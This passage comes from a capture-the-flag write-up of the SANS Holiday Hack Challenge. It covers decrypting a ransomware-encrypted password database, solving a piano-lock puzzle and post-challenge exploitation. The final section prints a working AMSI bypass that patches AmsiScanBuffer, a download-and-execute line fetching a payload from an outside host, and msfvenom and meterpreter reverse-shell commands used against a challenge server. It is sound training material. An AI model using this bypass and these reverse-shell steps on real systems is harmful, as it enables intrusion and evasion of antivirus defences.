88a8e4161def1e015f31f78d15bec0272b5599edb17a3cea7c2c9980bdc6d508089d961c5702aff0d38be6b93c1d907c
62436695b0d66f09193534f0e104cdff

PS &gt; <span style="color: #a0522d;">$Pub_key_encrypted_Key</span>.length
512
</pre>
</div>

<p>
So, we're looking for a 512-character long hex string. Our hint
points us to powerdump, so let's give that a shot, continuing to
follow along in Chris's video. Once we load and process the file,
we can search for a string:
</p>

<div class="org-src-container">
<pre class="src src-sh">============ Main <span style="color: #a0522d;">Menu</span> ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : True
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 4

[i] 10947 powershell Variable Values found!
============== Search/Dump PS Variable <span style="color: #a0522d;">Values</span> ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
<span style="color: #483d8b;">print</span>          | <span style="color: #483d8b;">print</span> [all|num]             | <span style="color: #483d8b;">print</span> specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches <span style="color: #8b2252;">"[python_regex]"</span>    | match python regex inside quotes
len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: <span style="color: #a0522d;">len</span> == 512

================ <span style="color: #a0522d;">Filters</span> ================
1| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
</pre>
</div>

<p>
Well, that was easy. We didn't even need a regular expression for
the hex-encoding, as there was only one variable of length 512.
</p>

<div class="org-src-container">
<pre class="src src-sh">: print 1
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531
b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4
d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b
379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010
0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7
d47681a77152563906a2c29c6d12f971
Press Enter to Continue...

================ <span style="color: #a0522d;">Filters</span> ================
1| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
</pre>
</div>

<p>
Looks like we found it! Let's also recover the SHA1 hash of the key, so that we can verify it's correct once we decrypt it. A hex-encoded SHA1 hash will be 40 characters long:
</p>

<div class="org-src-container">
<pre class="src src-sh">: <span style="color: #a0522d;">len</span> == 40

================ <span style="color: #a0522d;">Filters</span> ================
1| LENGTH  len(variable_values) == 40

[i] 45 powershell Variable Values found!
============== Search/Dump PS Variable <span style="color: #a0522d;">Values</span> ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
<span style="color: #483d8b;">print</span>          | <span style="color: #483d8b;">print</span> [all|num]             | <span style="color: #483d8b;">print</span> specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches <span style="color: #8b2252;">"[python_regex]"</span>    | match python regex inside quotes
len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: matches <span style="color: #8b2252;">"^[a-f0-9]+$"</span>

================ <span style="color: #a0522d;">Filters</span> ================
1| LENGTH  len(variable_values) == 40
2| MATCHES  bool(re.search(<span style="color: #483d8b;">r</span><span style="color: #8b2252;">"^[a-f0-9]+$"</span>,variable_values))

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable <span style="color: #a0522d;">Values</span> ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
<span style="color: #483d8b;">print</span>          | <span style="color: #483d8b;">print</span> [all|num]             | <span style="color: #483d8b;">print</span> specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches <span style="color: #8b2252;">"[python_regex]"</span>    | match python regex inside quotes
len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print
b0e59a5e0f00968856f22cff2d6226697535da5b     
</pre>
</div>

<p>
Now we can use the private key to decrypt it. At this point, we
ran into some issues doing this in Powershell, as loading private
key is a bit different from how the malware loads the public
key. We'll switch to Python for the rest of this challenge:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>

<span style="color: #a020f0;">import</span> binascii
<span style="color: #a020f0;">import</span> hashlib

<span style="color: #a020f0;">from</span> Crypto.Cipher <span style="color: #a020f0;">import</span> PKCS1_OAEP
<span style="color: #a020f0;">from</span> Crypto.PublicKey <span style="color: #a020f0;">import</span> RSA

<span style="color: #a0522d;">pub_key_encrypted_key</span> = <span style="color: #8b2252;">"3cf903522e..."</span>

<span style="color: #a0522d;">raw_encrypted_key</span> = binascii.unhexlify(pub_key_encrypted_key)

<span style="color: #a0522d;">rsa_key</span> = RSA.importKey(<span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">'../../artifacts/obj9/server.key'</span>, <span style="color: #8b2252;">"rb"</span>).read())
<span style="color: #a0522d;">cipher</span> = PKCS1_OAEP.new(rsa_key)

<span style="color: #a0522d;">decrypted_key</span> = cipher.decrypt(raw_encrypted_key)
<span style="color: #a0522d;">hex_key</span> = binascii.hexlify(decrypted_key)

<span style="color: #b22222;"># </span><span style="color: #b22222;">Check the SHA1 hash</span>
<span style="color: #a0522d;">sha1_target</span> = <span style="color: #8b2252;">"b0e59a5e0f00968856f22cff2d6226697535da5b"</span>
<span style="color: #a0522d;">sha1_result</span> = hashlib.sha1(hex_key).hexdigest()

<span style="color: #a020f0;">if</span> sha1_result == sha1_target:
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Found the key!"</span>, binascii.hexlify(decrypted_key)
<span style="color: #a020f0;">else</span>:
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Key SHA1 hash doesn't match..."</span>
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Target:"</span>, sha1_target, <span style="color: #8b2252;">"ours:"</span>, sha1_result
</pre>
</div>

<p>
Once we run that, we're greeted with <code>Found the key! fbcfc121915d99cc20a3d3d5d84f8308</code>.
</p>

<p>
Last step. Now we can use that key to decrypt the encrypted wannacookie file. Once again, we turn to Python:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>

<span style="color: #a020f0;">from</span> Crypto.Cipher <span style="color: #a020f0;">import</span> AES
<span style="color: #a020f0;">import</span> binascii
<span style="color: #a020f0;">import</span> struct

<span style="color: #a0522d;">hex_key</span> = <span style="color: #8b2252;">"fbcfc121915d99cc20a3d3d5d84f8308"</span>
<span style="color: #a0522d;">key</span> = binascii.unhexlify(hex_key)

<span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"../../artifacts/obj9/alabaster_passwords.elfdb.wannacookie"</span>, <span style="color: #8b2252;">'rb'</span>) <span style="color: #a020f0;">as</span> f:
    <span style="color: #b22222;"># </span><span style="color: #b22222;">$FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4)</span>
    <span style="color: #a0522d;">iv_length</span> = struct.unpack(<span style="color: #8b2252;">'i'</span>, f.read(4))[0]

    <span style="color: #b22222;"># </span><span style="color: #b22222;">$FileSW.Write($AESP.IV, 0, $AESP.IV.Length)</span>
    <span style="color: #a0522d;">iv</span> = f.read(iv_length)

    <span style="color: #a0522d;">rest</span> = f.read()

    <span style="color: #a0522d;">obj</span> = AES.new(key, AES.MODE_CBC, iv)

    <span style="color: #a0522d;">result</span> = <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"../../artifacts/obj9/alabaster_passwords.elfdb"</span>, <span style="color: #8b2252;">'wb'</span>)
    result.write(obj.decrypt(rest))
    result.close()
</pre>
</div>

<p>
End result: <code>alabaster_passwords.elfdb: SQLite 3.x database</code>. We've done this before!
</p>

<div class="org-src-container">
<pre class="src src-sh">$ sqlite3 alabaster_passwords.elfdb .dump
PRAGMA <span style="color: #a0522d;">foreign_keys</span>=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS <span style="color: #8b2252;">"passwords"</span> (
   <span style="color: #ff00ff;">`name`</span>       TEXT NOT NULL,
   <span style="color: #ff00ff;">`password`</span>   TEXT NOT NULL,
   <span style="color: #ff00ff;">`usedfor`</span>    TEXT NOT NULL
);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster.snowball'</span>,<span style="color: #8b2252;">'CookiesR0cK!2!#'</span>,<span style="color: #8b2252;">'active directory'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster@kringlecastle.com'</span>,<span style="color: #8b2252;">'KeepYourEnemiesClose1425'</span>,<span style="color: #8b2252;">'www.toysrus.com'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster@kringlecastle.com'</span>,<span style="color: #8b2252;">'CookiesRLyfe!*26'</span>,<span style="color: #8b2252;">'netflix.com'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster.snowball'</span>,<span style="color: #8b2252;">'MoarCookiesPreeze1928'</span>,<span style="color: #8b2252;">'Barcode Scanner'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster.snowball'</span>,<span style="color: #8b2252;">'ED#ED#EED#EF#G#F#G#ABA#BA#B'</span>,<span style="color: #8b2252;">'vault'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster@kringlecastle.com'</span>,<span style="color: #8b2252;">'PetsEatCookiesTOo@813'</span>,<span style="color: #8b2252;">'neopets.com'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster@kringlecastle.com'</span>,<span style="color: #8b2252;">'YayImACoder1926'</span>,<span style="color: #8b2252;">'www.codecademy.com'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster@kringlecastle.com'</span>,<span style="color: #8b2252;">'Woootz4Cookies19273'</span>,<span style="color: #8b2252;">'www.4chan.org'</span>);
INSERT INTO passwords VALUES(<span style="color: #8b2252;">'alabaster@kringlecastle.com'</span>,<span style="color: #8b2252;">'ChristMasRox19283'</span>,<span style="color: #8b2252;">'www.reddit.com'</span>);
COMMIT;
</pre>
</div>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
ED#ED#EED#EF#G#F#G#ABA#BA#B
</p>

</div>
<p>
:CUSTOM_ID: obj9
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-orgf58a968" class="outline-3">
<h3 id="obj10"><a id="orgf58a968"></a>Who Is Behind It All?</h3>
<div class="outline-text-3" id="text-obj10">
<div id="text-table-of-contents">
<ul>
<li><a href="#org098a037">Goal</a></li>
<li><a href="#orgd89eac2">Background</a></li>
<li><a href="#org7173c4f">Solution</a></li>
<li><a href="#bruijn_piano">de Bruijn Piano Lock?</a></li>
<li><a href="#rachmaninoff">Rachmaninoff?</a></li>
</ul>
</div>
</div>
<div id="outline-container-org098a037" class="outline-4">
<h4 id="org098a037">Goal</h4>
<div class="outline-text-4" id="text-org098a037">
<div class="note">
<p>
Use what you have learned from previous challenges to open the <a href="https://pianolockn.kringlecastle.com/">door to Santa's vault</a>. What message do you get when you unlock the door?
</p>

</div>
</div>
</div>
<div id="outline-container-orgd89eac2" class="outline-4">
<h4 id="orgd89eac2">Background</h4>
<div class="outline-text-4" id="text-orgd89eac2">
</div>
<ul class="org-ul">
<li><a id="org9712f15"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org9712f15">
<p>
Alabaster rewards us by saying:
</p>

<blockquote>
<p>
I'm seriously impressed by your security skills.
</p>

<p>
How could I forget that I used Rachmaninoff as my musical password?
</p>
</blockquote>
</div>
</li>
<li><a id="org1307622"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org1307622">
<p>
But wait! Checking our badge reveals&#x2026;
</p>

<blockquote>
<p>
Really, it's Mozart. And it should be in the key of D, not E.
</p>
</blockquote>
</div>
</li>
</ul>
</div>
<div id="outline-container-org7173c4f" class="outline-4">
<h4 id="org7173c4f">Solution</h4>
<div class="outline-text-4" id="text-org7173c4f">
<p>
We take the notes recovered from Alabaster's decrypted password vault, and try it on the piano lock. The document we recovered from Packalyzer helpfully shows us the notes on the piano keys.
</p>


<div class="figure">
<p><img src="./imgs/obj10_wrong_key.png" alt="obj10_wrong_key.png" width="500px" />
</p>
<p><span class="figure-number">Figure 58: </span>Wrong key</p>
</div>

<p>
The hint tells us that it should be in the key of D, not E. The Packalyzer document also told us how to transcribe music from one key to another. Let's try:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Note in key of E</th>
<th scope="col" class="org-left">Note in key of D</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">E</td>
<td class="org-left">D</td>
</tr>

<tr>
<td class="org-left">D#</td>
<td class="org-left">C#</td>
</tr>

<tr>
<td class="org-left">E</td>
<td class="org-left">D</td>
</tr>

<tr>
<td class="org-left">D#</td>
<td class="org-left">C#</td>
</tr>

<tr>
<td class="org-left">E</td>
<td class="org-left">D</td>
</tr>

<tr>
<td class="org-left">E</td>
<td class="org-left">D</td>
</tr>

<tr>
<td class="org-left">D#</td>
<td class="org-left">C#</td>
</tr>

<tr>
<td class="org-left">E</td>
<td class="org-left">D</td>
</tr>

<tr>
<td class="org-left">F#</td>
<td class="org-left">E</td>
</tr>

<tr>
<td class="org-left">G#</td>
<td class="org-left">F#</td>
</tr>

<tr>
<td class="org-left">F#</td>
<td class="org-left">E</td>
</tr>

<tr>
<td class="org-left">G#</td>
<td class="org-left">F#</td>
</tr>

<tr>
<td class="org-left">A</td>
<td class="org-left">G</td>
</tr>

<tr>
<td class="org-left">B</td>
<td class="org-left">A</td>
</tr>

<tr>
<td class="org-left">A#</td>
<td class="org-left">G#</td>
</tr>

<tr>
<td class="org-left">B</td>
<td class="org-left">A</td>
</tr>

<tr>
<td class="org-left">A#</td>
<td class="org-left">G#</td>
</tr>

<tr>
<td class="org-left">B</td>
<td class="org-left">A</td>
</tr>
</tbody>
</table>

<p>
Trying that sequence (<code>DC#DC#DDC#DEF#EF#GAG#AG#A</code>) reveals:
</p>


<div class="figure">
<p><img src="./imgs/obj10_right_key.png" alt="obj10_right_key.png" width="500px" />
</p>
<p><span class="figure-number">Figure 59: </span>Right key!</p>
</div>


<p>
Once we enter the vault, Alabaster tells us:
</p>

<blockquote>
<p>
Of course I transposed it it before I entered it into my database for extra security.
</p>
</blockquote>

<p>
Hans offers us a congratulations, and Santa explains the whole thing, finishing:
</p>

<blockquote>
<p>
You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?
</p>

<p>
They lived happily ever after.
</p>
</blockquote>

<p>
So, who was behind it all?
</p>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
Santa
</p>

</div>
</div>
</div>
<div id="outline-container-org4694fde" class="outline-4">
<h4 id="bruijn_piano"><a id="org4694fde"></a>de Bruijn Piano Lock?</h4>
<div class="outline-text-4" id="text-bruijn_piano">
<p>
After learning about <a href="#obj3">de Bruijn</a> sequences, we were curious if that
would work here. The lock seemed to operate in the same way, as it
would try unlocking after each note was pressed. We noticed that
the tune in question had a similar note pattern at the end
(<code>AG#AG#A</code>) as at the beginning (<code>DC#DC#D</code>). We whipped up a quick
Python program that verified that in fact we could generate a de
Bruijn sequence.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>

<span style="color: #a0522d;">notes</span> = [<span style="color: #8b2252;">'C'</span>, <span style="color: #8b2252;">'C#'</span>, <span style="color: #8b2252;">'D'</span>, <span style="color: #8b2252;">'D#'</span>, <span style="color: #8b2252;">'E'</span>, <span style="color: #8b2252;">'F'</span>, <span style="color: #8b2252;">'F#'</span>, <span style="color: #8b2252;">'G'</span>, <span style="color: #8b2252;">'G#'</span>, <span style="color: #8b2252;">'A'</span>, <span style="color: #8b2252;">'A#'</span>, <span style="color: #8b2252;">'B'</span>]
<span style="color: #a0522d;">tune</span> = [<span style="color: #8b2252;">'E'</span>, <span style="color: #8b2252;">'D#'</span>, <span style="color: #8b2252;">'E'</span>, <span style="color: #8b2252;">'D#'</span>, <span style="color: #8b2252;">'E'</span>, <span style="color: #8b2252;">'E'</span>, <span style="color: #8b2252;">'D#'</span>, <span style="color: #8b2252;">'E'</span>, <span style="color: #8b2252;">'F#'</span>, <span style="color: #8b2252;">'G#'</span>, <span style="color: #8b2252;">'F#'</span>, <span style="color: #8b2252;">'G#'</span>, <span style="color: #8b2252;">'A'</span>, <span style="color: #8b2252;">'B'</span>, <span style="color: #8b2252;">'A#'</span>, <span style="color: #8b2252;">'B'</span>, <span style="color: #8b2252;">'A#'</span>, <span style="color: #8b2252;">'B'</span>]

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">adjust</span>(offset):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> note <span style="color: #a020f0;">in</span> tune:
        <span style="color: #a0522d;">index</span> = notes.index(note)
        <span style="color: #a0522d;">index</span> += offset
        <span style="color: #a020f0;">if</span> index &gt;= <span style="color: #483d8b;">len</span>(notes):
            <span style="color: #a0522d;">index</span> = index % <span style="color: #483d8b;">len</span>(notes)

        result.append(notes[index])
    <span style="color: #a020f0;">return</span> result

<span style="color: #a0522d;">first</span> = tune[0]
<span style="color: #a0522d;">result</span> = adjust(0)
<span style="color: #a0522d;">last</span> = result[-1]

<span style="color: #a0522d;">offsets</span> = [0]

<span style="color: #a0522d;">sequence</span> = result[:-5]

<span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    <span style="color: #a0522d;">offset</span> = notes.index(last) - notes.index(first)
    <span style="color: #a020f0;">if</span> offset <span style="color: #a020f0;">in</span> offsets:
        <span style="color: #b22222;"># </span><span style="color: #b22222;">Loop detected</span>
        <span style="color: #a020f0;">break</span>

    <span style="color: #a0522d;">result</span> = adjust(offset)
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Key is now"</span>, result[0]
    <span style="color: #a0522d;">last</span> = result[-1]

    offsets.append(offset)
    <span style="color: #a0522d;">sequence</span> += result[:-5]

<span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"de Bruijn sequence is"</span>, <span style="color: #483d8b;">len</span>(sequence), <span style="color: #8b2252;">"notes long."</span>
<span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Without de Bruijn, it would've been"</span>, <span style="color: #483d8b;">len</span>(offsets)*<span style="color: #483d8b;">len</span>(tune), <span style="color: #8b2252;">"notes long."</span>
<span style="color: #a020f0;">print</span> <span style="color: #8b2252;">" "</span>.join(sequence)
</pre>
</div>

<p>
The result was:
</p>

<pre class="example">
Key is now B
Key is now F#
Key is now C#
Key is now G#
Key is now D#
Key is now A#
Key is now F
Key is now C
Key is now G
Key is now D
Key is now A
de Bruijn sequence is 156 notes long.
Without de Bruijn, it would've been 216 notes long.
E D# E D# E E D# E F# G# F# G# A B A# B A# B B A# B C# D# C# D# E
F# F F# F F# F# F F# G# A# G# A# B C# C C# C C# C# C C# D# F D# F F
# G# G G# G G# G# G G# A# C A# C C# D# D D# D D# D# D D# F G F G G
# A# A A# A A# A# A A# C D C D D# F E F E F F E F G A G A A
# C B C B C C B C D E D E F G F# G F# G G F# G A B A B C
D C# D C# D D C# D E F# E F# G A G# A G# A A G# A B C# B C# D
</pre>

<p>
What's even cooler is that the sequence goes through all of the keys before it repeats!
</p>


<div class="figure">
<p><img src="./imgs/debruijn_piano.png" alt="debruijn_piano.png" width="750px" />
</p>
<p><span class="figure-number">Figure 60: </span>de Bruijn key sequence for Marriage of Figaro</p>
</div>
</div>
</div>

<div id="outline-container-org7a3f0a4" class="outline-4">
<h4 id="rachmaninoff"><a id="org7a3f0a4"></a>Rachmaninoff?</h4>
<div class="outline-text-4" id="text-rachmaninoff">
<p>
As we walk around the castle, everyone congratulates us on
winning. However, we don't feel complete, as we're left with the
nagging question of what in the world Alabaster was talking about
with his Rachmaninoff-no-really-Mozart song. We have the notes,
but not the tune. Can we figure out the song?
</p>

<p>
This one we solved two ways:
</p>

<p>
Musipedia.org allows you to search by melodic contour (Parsons
code). By simply saying if each note progression goes up, down, or
repeats, it can find the closest matches:
</p>


<div class="figure">
<p><img src="./imgs/obj10_musipedia.png" alt="obj10_musipedia.png" width="500px" />
</p>
<p><span class="figure-number">Figure 61: </span>Musipedia Parsons search</p>
</div>

<p>
The Wedding of Figaro seems to match perfectly:
</p>


<div class="figure">
<p><img src="./imgs/obj10_figaro.png" alt="obj10_figaro.png" width="750px" />
</p>
<p><span class="figure-number">Figure 62: </span>Wedding of Figaro, by Mozart</p>
</div>

<p>
But still&#x2026; why Rachmaninoff, then? The answer is found in the second method we used to figure this out:
</p>


<div class="figure">
<p><img src="./imgs/obj10_facebook.png" alt="obj10_facebook.png" width="500px" />
</p>
<p><span class="figure-number">Figure 63: </span>Asking on Facebook&#x2026;</p>
</div>

<p>
 <video width="640" height="480" controls><source src="./vids/rachmaninoff.mov" type="video/mp4">Your browser does not support the video tag.</video>
</p>

<p>
And with that, Santa's parting words make a lot more sense too:
</p>

<p>
 <video width="640" height="480" controls><source src="./vids/willywonkaending.mp4" type="video/mp4">Your browser does not support the video tag.</video>
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgb101d11" class="outline-2">
<h2 id="escalations"><a id="orgb101d11"></a>Going Further: Escalations and 0days</h2>
<div class="outline-text-2" id="text-escalations">
<p>
At this point, we've solved it all! However, our curiousity is unabated, and we'd like to know what else we can find&#x2026;
</p>
</div>
<div id="outline-container-orge3c2104" class="outline-3">
<h3 id="orge3c2104">Note</h3>
<div class="outline-text-3" id="text-orge3c2104">
<p>
A few portions of this section are embargoed, as we're waiting for CVE assignment, and SANS asked us to not publish it yet.
</p>
</div>
</div>
<div id="outline-container-orge6ecaaa" class="outline-3">
<h3 id="orge6ecaaa">Scan-O-Matic</h3>
<div class="outline-text-3" id="text-orge6ecaaa">
<p>
We managed to get through the <a href="#obj6">Scan-O-Matic</a>, but we were curious to see who had access. 
</p>

<p>
We wrote <a href="#appendix_tools">two simple tools</a> which allowed us to use <code>sqlmap</code> to enumerate the rest of the data in the table:
</p>

<pre class="example">
+------------------+---------+----------------+------------+------------+
| uid              | enabled | last_name      | first_name | authorized |
+------------------+---------+----------------+------------+------------+
| 1eyLovhxiOIlfRUG | 0       | evergreen      | bushy      | 0          |
| 5qLIf1BXX4Sv8sEX | 0       | minstix        | pepper     | 0          |
| 8DEb50kquIoIoUtg | 0       | redberry       | sparkle    | 0          |
| dsdZpzQxGCqaA2Zn | 0       | candycane      | minty      | 0          |
| exO6PqczJ7WedM2Q | 0       | upatree        | shimmy     | 0          |
| I7SfXpRjJ1iVSfdt | 0       | openslae       | wunorse    | 0          |
| Io2gs3VigcqjSxW2 | 0       | claus          | santa      | 1          |
| N2Jg3gxC5aXHVjjD | 0       | sugarplum      | mary       | 0          |
| nb8ZVgfMk9OYtuCl | 1       | &lt;blank&gt;        | theo       | 1          |
| oRfjg5uGHmbduj2m | 0       | snowball       | alabaster  | 1          |
| P8qXJeGhy1LRlM5e | 0       | mcjinglehauser | tarpin     | 0          |
| VvYFHiGQzrQB9eAT | 0       | evergreen      | holy       | 0          |
+------------------+---------+----------------+------------+------------+
</pre>

<p>
We note that only <a href="#eggs">Theo</a> has access.
</p>
</div>
</div>
<div id="outline-container-orgc35f308" class="outline-3">
<h3 id="orgc35f308">Popping a shell on careers</h3>
<div class="outline-text-3" id="text-orgc35f308">
<p>
The final system we turned our attention to was
careers.kringlecastle.com. We already got our file off of this
system, but we'd like to see what else we can do.
</p>

<p>
We first tried to get a meterpreter session running, but quickly
found that Windows Defender was blocking it. We were able to bypass Defender with this method: <a href="https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/">https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/</a>
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #a0522d;">$Ref</span> = (
<span style="color: #8b2252;">"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"</span>,
<span style="color: #8b2252;">"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span>
)

<span style="color: #a0522d;">$Source</span> = @<span style="color: #8b2252;">"</span>
<span style="color: #8b2252;">using System;</span>
<span style="color: #8b2252;">using System.Runtime.InteropServices;</span>

<span style="color: #8b2252;">namespace Bypass</span>
<span style="color: #8b2252;">{</span>
<span style="color: #8b2252;">    public class AMSI</span>
<span style="color: #8b2252;">    {</span>
<span style="color: #8b2252;">        [DllImport("kernel32")]</span>
<span style="color: #8b2252;">        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span>
<span style="color: #8b2252;">        [DllImport("kernel32")]</span>
<span style="color: #8b2252;">        public static extern IntPtr LoadLibrary(string name);</span>
<span style="color: #8b2252;">        [DllImport("kernel32")]</span>
<span style="color: #8b2252;">        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span>

<span style="color: #8b2252;">        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]</span>
<span style="color: #8b2252;">        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);</span>

<span style="color: #8b2252;">        public static int Disable()</span>
<span style="color: #8b2252;">        {</span>
<span style="color: #8b2252;">            IntPtr TargetDLL = LoadLibrary("amsi.dll");</span>
<span style="color: #8b2252;">            if (TargetDLL == IntPtr.Zero) { return 1; }</span>

<span style="color: #8b2252;">            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");</span>
<span style="color: #8b2252;">            if (ASBPtr == IntPtr.Zero) { return 1; }</span>

<span style="color: #8b2252;">            UIntPtr dwSize = (UIntPtr)5;</span>
<span style="color: #8b2252;">            uint Zero = 0;</span>

<span style="color: #8b2252;">            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }</span>

<span style="color: #8b2252;">            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };</span>
<span style="color: #8b2252;">            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);</span>
<span style="color: #8b2252;">            Marshal.Copy(Patch, 0, unmanagedPointer, 6);</span>
<span style="color: #8b2252;">            MoveMemory(ASBPtr, unmanagedPointer, 6);</span>

<span style="color: #8b2252;">            return 0;</span>
<span style="color: #8b2252;">        }</span>
<span style="color: #8b2252;">    }</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">"@</span>

<span style="color: #0000ff;">Add-Type</span> <span style="color: #008b8b;">-ReferencedAssemblies</span> <span style="color: #a0522d;">$Ref</span> <span style="color: #008b8b;">-TypeDefinition</span> <span style="color: #a0522d;">$Source</span> <span style="color: #008b8b;">-Language</span> CSharp
<span style="color: #228b22;">[Bypass.AMSI]</span>::Disable();

<span style="color: #b22222;"># This loads and runs our actual payload</span>
IEX ((<span style="color: #0000ff;">new-object</span> net.webclient).downloadstring(<span style="color: #8b2252;">"http://1.2.3.4/hugs.ps1"</span>));
</pre>
</div>

<p>
To create our actual payload, we use <code>msfvenom</code> once again. For
the reasons listed in the article above, we're careful to use a
64-bit payload, so as to not spawn a non-bypassed 32-bit
Powershell instance.
</p>

<div class="org-src-container">
<pre class="src src-sh">$ msfvenom --platform windows -p windows/x64/meterpreter_reverse_tcp <span style="color: #a0522d;">LHOST</span>=1.2.3.4 <span style="color: #a0522d;">LPORT</span>=4444 -f psh -o hugs.ps1
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 205379 bytes
Final size of psh file: 959328 bytes
Saved as: hugs.ps1
</pre>
</div>

<p>
We fire up meterpreter (<code>-x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp ; set LHOST 1.2.3.4; run"</code>), and soon see:
</p>

<pre class="example">
[*] Meterpreter session 1 opened (1.2.3.4:4444 -&gt; 35.231.207.76:49832) at 2019-01-14 09:16:54 +0000
msf exploit(handler) &gt; sessions -i 1

[*] Starting interaction with 1...

meterpreter &gt; ps

Process List
============

PID   PPID  Name                 Arch  Session  User                        Path
---   ----  ----                 ----  -------  ----                        ----
0     0     [System Process]
4     0     System
264   592   svchost.exe
280   4     smss.exe
368   360   csrss.exe
448   360   wininit.exe
456   440   csrss.exe
480   2180  powershell.exe       x64   0        HHC18-DDE\sparkle.redberry  C:\Windows\System32\WindowsPowerShell...
</pre>

<p>
Unfortunately, our shell will get killed off after about 30
seconds. So, we'll migrate to another process. We see that
Sparkle is running the Non-Sucking Service Manager, so we'll try
to migrate to that process:
</p>

<pre class="example">
msf exploit(handler) &gt; set AutoRunScript post/windows/manage/migrate SPAWN=false PID=2864
AutoRunScript =&gt; post/windows/manage/migrate SPAWN=false PID=2864
msf exploit(handler) &gt; rerun
[*] Stopping existing job...
[*] Reloading module...
[*] Exploit running as background job 1.
